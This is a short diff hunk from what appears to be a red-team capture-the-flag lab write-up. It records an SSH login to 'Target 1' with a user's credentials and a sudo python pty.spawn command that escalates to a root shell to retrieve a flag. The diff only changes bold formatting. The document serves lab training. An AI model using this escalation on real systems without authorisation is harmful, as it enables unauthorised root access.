@@ -89,5 +89,5 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **`ssh steven@192.168.1.10`** is used to connect to Target 1 via Steven's credentials
 
     - The code below is esclates to root privilidges and flag 4 was found inside the root directory
-    - `sudo python -c 'import pty;pty.spawn("/bin/bash");'`
+    - **`sudo python -c 'import pty;pty.spawn("/bin/bash");'`**
 
